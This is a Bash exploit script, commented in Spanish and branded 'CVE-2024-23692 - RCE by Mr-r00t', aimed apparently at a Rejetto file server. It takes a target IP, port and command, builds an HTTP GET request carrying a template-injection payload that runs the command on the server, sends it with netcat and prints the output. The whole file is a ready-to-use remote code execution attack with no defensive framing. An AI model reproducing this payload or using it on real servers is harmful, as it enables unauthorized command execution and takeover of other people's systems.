#!/bin/bash

# Colores para el texto
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No color

# Verificar que se proporcionen todos los parámetros
if [ $# -ne 3 ]; then
    echo ""
    echo -e "${GREEN}██████╗ ███████╗     ██╗███████╗████████╗████████╗ ██████╗ ${NC}"
    echo -e "${GREEN}██╔══██╗██╔════╝     ██║██╔════╝╚══██╔══╝╚══██╔══╝██╔═══██╗${NC}"
    echo -e "${GREEN}██████╔╝█████╗       ██║█████╗     ██║      ██║   ██║   ██║${NC}"
    echo -e "${GREEN}██╔══██╗██╔══╝  ██   ██║██╔══╝     ██║      ██║   ██║   ██║${NC}"
    echo -e "${GREEN}██║  ██║███████╗╚█████╔╝███████╗   ██║      ██║   ╚██████╔╝${NC}"
    echo -e "${GREEN}╚═╝  ╚═╝╚══════╝ ╚════╝ ╚══════╝   ╚═╝      ╚═╝    ╚═════╝ ${NC}"
    echo -e "${RED}   ________ CVE-2024-23692 - RCE by Mr-r00t _________   ${NC}"
    echo "Uso: $0 <IP_del_servidor> <puerto> <comando>"
    exit 1
fi

# Asignar parámetros a variables
ip_servidor=$1
puerto=$2
comando=$3

# Construir la solicitud HTTP con el comando proporcionado por el usuario
request="GET /?n=%0A&index=%00&&cmd=${comando}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.^abc.}===={.?n.} HTTP/1.1\r\nHost: ${ip_servidor}\r\n\r\n"

# Mostrar la solicitud construida
#echo -e "Solicitud HTTP generada:\n$request"

# Enviar la solicitud HTTP utilizando nc (netcat)
echo ""
echo -e "${GREEN}██████╗ ███████╗     ██╗███████╗████████╗████████╗ ██████╗ ${NC}"
echo -e "${GREEN}██╔══██╗██╔════╝     ██║██╔════╝╚══██╔══╝╚══██╔══╝██╔═══██╗${NC}"
echo -e "${GREEN}██████╔╝█████╗       ██║█████╗     ██║      ██║   ██║   ██║${NC}"
echo -e "${GREEN}██╔══██╗██╔══╝  ██   ██║██╔══╝     ██║      ██║   ██║   ██║${NC}"
echo -e "${GREEN}██║  ██║███████╗╚█████╔╝███████╗   ██║      ██║   ╚██████╔╝${NC}"
echo -e "${GREEN}╚═╝  ╚═╝╚══════╝ ╚════╝ ╚══════╝   ╚═╝      ╚═╝    ╚═════╝ ${NC}"
echo -e "${RED}   ________ CVE-2024-23692 - RCE by Mr-r00t _________   ${NC}"

echo -ne "$request" | nc $ip_servidor $puerto >/dev/null 2>&1 &

# Capturar y mostrar la respuesta
response=$(echo -e "$request" | nc $ip_servidor $puerto)
echo -e "\nRespuesta recibida:\n$response"
killall nc >/dev/null 2>&1
